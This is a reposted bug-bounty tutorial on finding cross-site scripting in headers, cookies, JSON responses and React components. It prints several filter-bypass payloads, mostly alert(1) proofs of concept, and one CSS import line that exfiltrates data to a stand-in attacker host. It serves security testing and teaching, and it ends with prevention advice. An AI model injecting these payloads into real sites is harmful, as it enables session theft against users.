# :globe_with_meridians: 🚨 From alert(1) to Real-world Impact: Hunting XSS Where Others Don’t Look

> **Original Source:** [🚨 From alert(1) to Real-world Impact: Hunting XSS Where Others Don’t Look](https://infosecwriteups.com/from-alert-1-to-real-world-impact-hunting-xss-where-others-dont-look-27f70dbe9778)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# 🚨 From alert(1) to Real-world Impact: Hunting XSS Where Others Don’t Look


I was testing a web application late one night when I triggered a humble alert(1) box. It blinked on my screen, almost mockingly — something every hacker sees countless times. But this wasn’t just another popup. This one cracked the application wide open.

### 🧠 What Is XSS, Really?


Cross-Site Scripting (XSS) is more than a basic vulnerability. It's a fundamental failure in how a web app handles user input — and it’s still everywhere in 2025.


*How does it work?*


XSS allows attackers to inject JavaScript into a website viewed by others. When executed in the victim’s browser, it can:


- Steal cookies, session tokens, or credentials

- Perform actions on behalf of users

- Redirect to malicious pages or phishing kits

- Bypass security controls with crafted payloads

### 🧬 The Types You Know (and One You May Not)


Most guides list the usual suspects:


- Stored XSS — Payload gets stored (like in a comment) and executes when viewed.


2. Reflected XSS — Payload is reflected off the server immediately, often via URL.


3. DOM-based XSS — The client-side JavaScript is the source of the vulnerability.


But the reality is more nuanced. Modern apps blur these lines — with Single Page Applications (SPAs), APIs, and frontend frameworks introducing new attack surfaces.

### 🔍 The XSS That Hides in Plain Sight


Let me share how I find XSS in places others skip — and how you can too.

### 1. 🧵 Header-Based Reflections


Everyone tests forms. Few test headers.


I once found a reflected XSS by modifying the Referer header like this:


```
Referer: <script>alert(1)</script>
```


When the app used that header value in a client-side notification, the payload executed flawlessly.


Headers to try:


- User-Agent

- Referer

- X-Forwarded-For

- X-Requested-With


🔥 Pro Tip: *Use Burp Suite or curl to manually modify headers — some bugs don't show up in browser-based testing.*

### 2. 🍪 Cookie Injection


Many apps store themes, preferences, or user settings in cookies. And sometimes, those values are reflected back in the DOM.


Imagine setting:


```
theme=<img src=x onerror=alert(1)>
```


Then visiting a page that pulls the cookie into the frontend. Boom.


This kind of XSS is often missed by automated scanners, but you can catch it by inspecting cookie usage in DevTools.

### 3. 📦 JSON-Based Reflections


Modern apps often reflect input through JSON APIs, and JavaScript renders them directly:


```
{ "msg": "Hello, <script>alert(1)</script>" }
```


If this gets parsed into the DOM without escaping, it's game over.


## Get Aashif’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Look for:


```
/api/ or /search/ endpoints
```


```
msg, desc, or label fields
```


Template rendering in JavaScript


Also try:


```
{ "error": "<img src=x onerror=alert(1)>" }
```


### 4. 🧩 The Shadow DOM


Here's a sneaky one: some frontend libraries (especially React and Vue) inject user data into the DOM with little-to-no sanitization — especially in dynamic components like:


```
<div dangerouslySetInnerHTML={{__html: userInput}}>
```


This isn’t just DOM XSS — it’s a developer trap.


Use payloads like:


```
<svg/onload=alert(1)> <iframe src="javascript:alert(1)">
```


Or even CSS-based exfiltration:


```
<style>@import 'http://yourserver.com'</style>
```


### 🛠️ Tools That Actually Help


Forget brute-force lists. These tools adapt to the context of the application:


- Dalfox – *Fast and intelligent XSS scanner with context-aware fuzzing*

- XSStrike – *Advanced payload generation, filter detection, and DOM XSS detection*

- Burp Suite – *Your best friend for intercepting and testing inputs*

- Chrome DevTools – *Perfect for identifying how scripts are inserted in real time*

### 📜 Real-World Payloads That Work in 2025


Here are a few payloads that bypass modern filters:


```
<img src=x onerror=alert(1)>
```


```
<svg onload=alert`1`>
```


```
<iframe src="javascript:alert(1)">
```


```
<math href="data:x,alert(1)">
```


```
<video><source onerror="alert(1)">
```


Always customize payloads based on context — HTML, JavaScript, or URL injection.

### ✅ How Developers Can Prevent It


- *Avoid innerHTML, document.write, and similar unsafe APIs*

- *Use Content Security Policy (CSP) to block inline scripts*

- *Validate input — but more importantly, sanitize output.*

### Bonus Tip: XSS in Error Messages


- *Observe how your input is reflected in the error message*

- *Look for stack traces, JavaScript logs, or dynamic error responses*

>

*I once found a reflected XSS inside a custom 404 page — where my payload was shown in a debug box. That single popup netted me a critical bounty.*


### ✍️ Final Thoughts


*We tend to associate XSS with beginner hacking, but in reality, it rewards persistence and creativity. You can test the same site as 1,000 others — but if you look in the right places, with the right payloads, you’ll find what they missed.*

>

It all starts with alert(1) — and ends with real impact.

---

*Originally published on [Medium](https://infosecwriteups.com/from-alert-1-to-real-world-impact-hunting-xss-where-others-dont-look-27f70dbe9778). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
